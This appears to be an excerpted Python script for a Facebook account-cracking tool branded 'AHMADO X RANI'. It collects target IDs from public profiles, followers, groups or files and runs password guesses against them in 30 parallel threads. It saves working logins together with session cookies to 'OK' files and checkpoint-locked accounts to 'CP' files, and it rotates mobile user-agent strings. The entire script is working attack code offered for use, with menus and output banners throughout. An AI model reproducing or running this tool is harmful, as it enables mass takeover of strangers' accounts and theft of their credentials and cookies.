...
CON=sol()
#------------------[ USER-AGENT ]-------------------#
ugen2=['Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.97 Mobile Safari/537.36']
ugen=['Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.97 Mobile Safari/537.36']
cokbrut=[]
...
try:
	...
	print('[[\x1b[1;92mâ€¢\x1b[1;97m] [\x1b[1;96mAHMADO X RANI INSIDE')
...
def banner():
	clear()
	alvino_xy(f'''
\033[1;92m   _______           _______  _______  ______   _______ 
\033[1;92m  (  ___  )|\     /|(       )(  ___  )(  __  \ (  ___  )
\033[1;92m  | (   ) || )   ( || () () || (   ) || (  \  )| (   ) |
\033[1;92m  | (___) || (___) || || || || (___) || |   ) || |   | |
\033[1;92m  |  ___  ||  ___  || |(_)| ||  ___  || |   | || |   | |
\033[1;92m  | (   ) || (   ) || |   | || (   ) || |   ) || |   | |
\033[1;92m  | )   ( || )   ( || )   ( || )   ( || (__/  )| (___) |
\033[1;92m  |/     \||/     \||/     \||/     \|(______/ (_______)                                                                               
			{m}•{k}•{h}•{sir} TEAM : AHMADO X RANI {x}{m}•{k}•{h}•{x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def menu(my_name,my_id):
	...
	cetak(nel('\tWELCOME [green]%s[white] AHMADO'%(my_name)))
	alvino_xy(f'>> YOUR ID : '+str(my_id))
	alvino_xy(f'>> YOUR IP  : {ip}')
	print('')
	print('\033[1;92m [1]. CRACK FRON PUBLIC ')
	print('\033[1;93m [2]. CRACK FROM FOLLOWER ')
	print('\033[1;92m [3]. CRACK FROM GROUP   ')
	print('\033[1;93m [4]. CRACK FROM FILE	')
	print('\033[1;92m [5]. CRACK RESULT  ')
	print('\033[1;93m [0]. RETRUN       ')
	_____alvino__adijaya_____ = input('\033[1:91m CHOOSE : ')
	if _____alvino__adijaya_____ in ['1']:
		...
		print('\033[1:91mSUCCESSFULLY LOGOUT+DELETE COOKIES ')
		exit()
	else:
	...
	if kz in ['1','01']:
		...
		if len(vin)==0:
			...
			try:geh = lol[geeh]
				...
				print('>> Choose the Right Kontol ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('>> FILE NOT FOUBT ')
				time.sleep(2)
				back()
			nocp=0
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('>> HOW MUCH DO YOU WANT ADD ID ? : '))
	except ValueError:
	...
	for met in range(jum):
		yz+=1
		kl = input('>> ENTER THE IDZ WHICH TO '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			...
			print('>> SIGNAL LOH KEK KONTOLL ')
			exit()
	try:
		print('')
		print(f'>> TOTAL IDZ COLLECTEDðŸ”¥{h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('>> Signal Loh Kek Kontoll ')
...
def dump_pengikut():
	try:
		...
		exit()
	print('\033[1:92mTYPE ( ME ) IF YOU WANT TO CRACK YOUR OWN FOLLOWER ')
	pil = input('>> ENTER TARGET ID : ')
	try:
...
def lah():
	...
	input(balmond+m +"\x1b[1;97m CLICK [\x1b[1;96m ENTER ]\x1b[1;97m If you want to directly crack !!")
	pass
	setting()
def grup():
	print('')
	...
	try:
		...
		print(balmond+m+" Internet Connection Problem..")
		time.sleep(0.5)
		exit()
	berr = gn.find("title")
	...
	print(""+balmond+p+" \x1b[1;94m>> GROUP NAME :\x1b[1;97m "+berr2)
...
def grup1(urls):
	...
	print(balmond+m+" \x1b[1;94mPRESS CTRL + Z TO STOP")
	while True:
		try:
			ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
			miskinlu = {"user-agent": ua}
...
def crack_file():
	...
	if len(vin)==0:
		...
		try:geh = lol[geeh]
			...
			print(f'{k}>> Choose the Right Kontol {x}')
			time.sleep(3)
			back()
...
#	else:
#		taplikasi.append('no')
	pwplus=input('>> ADD PASSWORD MANUAL ( Y/N ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] ENTER AN ADDITIONAL PASSWORD OF AT LEAST 6 CHARACTERS\n[[cyan]â€¢[white]] EXAMPLE :[green] ahmado,123456,786786[white] '))
...
def passwrd():
	...
	print('')
	print(f'>>  {h}OK{x} RESULTS SAVED IN : {h}OK/%s {x}'%(okc))
	print(f'>>  {k}CP{x} RESULTS SAVED IN : {k}CP/%s {x}'%(cpc))
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[cyan]>>[green] CRACK COMPLETE, DONT FORGET TO BE THANKFUL[cyan] <<[white] '))
	print(f'[{b}â€¢{x}]{h} OK : {h}%s '%(ok))
	print(f'{x}[{b}â€¢{x}]{k} CP : {k}%s{x} '%(cp))
	print('')
	print('>> CONTINUE CRACKING BACK ( Y/N ) ? ')
	woi = input('>> CHOOSE : ')
	if woi in ['y','Y']:
		back()
	else:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r [AHMADO] {P}[{b}{loop}{P}/{u}{len(id)}{P}]--{P}[{H}{ok}{P}]--{P}[{k}{cp}{x}]--[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
...
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r [AHMADO] {P}[{asu}Mbasic{P}]{P}[{b}{loop}{P}/{p}{len(id)}{P}]--{P}[{H}{ok}{P}]--{P}[{k}{cp}{x}]--[{m}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='AHMADO-XD CP'))
					open('/sdcard/AHMADO-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/AHMADO-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='AHMADO-OK'))
					ok+=1
					break
					...
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]AHMADO-OK[/bold green]'))
					ok+=1
					break
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='AHMADO-CP'))
					open('/sdcard/AHMADO-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
...
def cek_opsi():
	...
	cetak(nel(hu, title='CHEAK OPTION'))
	input(x+'['+h+'â€¢'+x+'] START')
